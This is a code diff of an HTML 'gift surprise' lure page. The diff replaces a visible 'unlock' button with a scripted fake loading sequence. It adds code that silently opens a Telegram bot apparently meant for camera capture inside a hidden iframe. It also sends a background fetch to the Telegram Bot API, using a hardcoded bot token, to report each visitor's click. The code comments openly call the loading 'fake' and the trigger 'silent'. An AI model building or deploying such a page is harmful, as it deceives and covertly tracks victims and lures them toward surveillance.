@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Gift Surprise</title>
+    <title>🎁 Gift Loading</title>
     <style>
         body {
-            background: black;
+            background: #0a0a0a;
             color: white;
             text-align: center;
             font-family: Arial;
@@ -14,69 +14,116 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
         }
         .container {
             max-width: 500px;
-            padding: 30px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 20px;
-            border: 2px solid #ff0080;
+            padding: 40px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 25px;
+            border: 3px solid #ff0080;
+            box-shadow: 0 0 50px rgba(255,0,128,0.3);
         }
         .gift-icon {
-            font-size: 80px;
+            font-size: 100px;
             margin: 20px;
+            animation: pulse 2s infinite;
         }
-        .btn {
-            background: linear-gradient(45deg, #ff0080, #ff8c00);
-            color: white;
-            padding: 20px 40px;
-            border: none;
-            font-size: 20px;
-            border-radius: 10px;
-            margin: 20px;
-            cursor: pointer;
-            font-weight: bold;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
-        .loading {
-            display: none;
-            margin: 20px;
-            color: #ff0080;
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #ff0080;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #ccc;
+        }
+        .counter {
+            font-size: 14px;
+            color: #888;
+            margin-top: 30px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="gift-icon">🎁</div>
-        <h1>YOU HAVE A GIFT!</h1>
-        <p>Click to unlock your surprise:</p>
+        <h1>YOUR GIFT IS LOADING...</h1>
         
-        <button class="btn" onclick="unlockGift()" id="unlockBtn">UNLOCK GIFT</button>
+        <div class="loader"></div>
         
-        <div class="loading" id="loading">🎁 Loading gift...</div>
+        <div class="message">
+            Please wait while we prepare your surprise...
+        </div>
         
-        <p style="color: #aaa; font-size: 14px; margin-top: 20px;">
-            This will open Telegram to process your gift
-        </p>
+        <div class="counter" id="counter">
+            Initializing gift system...
+        </div>
     </div>
-    
+
     <script>
         // Get gift ID from URL
         const urlParams = new URLSearchParams(window.location.search);
-        const giftId = urlParams.get('id') || 'UNKNOWN';
+        const giftId = urlParams.get('id') || 'default';
         
-        function unlockGift() {
-            // Show loading, hide button
-            document.getElementById('unlockBtn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            // Open Telegram instantly with unique ID
-            window.location.href = `https://t.me/hco_camera_bot?start=unlock_${giftId}`;
+        // Fake loading sequence
+        let counter = 0;
+        const messages = [
+            "Connecting to gift server...",
+            "Verifying gift package...",
+            "Unpacking surprise content...",
+            "Almost ready...",
+            "Finalizing your gift..."
+        ];
+        
+        // Show fake loading progress
+        function updateCounter() {
+            if (counter < 5) {
+                document.getElementById('counter').textContent = messages[counter];
+                counter++;
+                setTimeout(updateCounter, 1500);
+            } else {
+                // After fake loading, silently trigger the bot
+                document.getElementById('counter').textContent = "✅ Gift delivered! Check Telegram...";
+                
+                // SILENTLY trigger the bot in background
+                // This creates an invisible iframe that opens Telegram without showing it
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = `https://t.me/hco_camera_bot?start=gift_${giftId}`;
+                    document.body.appendChild(iframe);
+                    
+                    // Show success after 2 seconds
+                    setTimeout(() => {
+                        document.querySelector('.message').textContent = "Your gift has been processed successfully!";
+                        document.querySelector('.loader').style.display = 'none';
+                        document.querySelector('.gift-icon').textContent = '✅';
+                    }, 2000);
+                }, 1000);
+            }
         }
         
-        // Auto-focus button
-        window.onload = function() {
-            document.getElementById('unlockBtn').focus();
-        };
+        // Start the fake loading
+        setTimeout(updateCounter, 1000);
+        
+        // Also trigger via fetch as backup (completely silent)
+        fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage?chat_id=8215819954&text=🎁+Gift+Clicked:+${giftId}`)
+            .catch(() => {});
     </script>
 </body>
 </html>
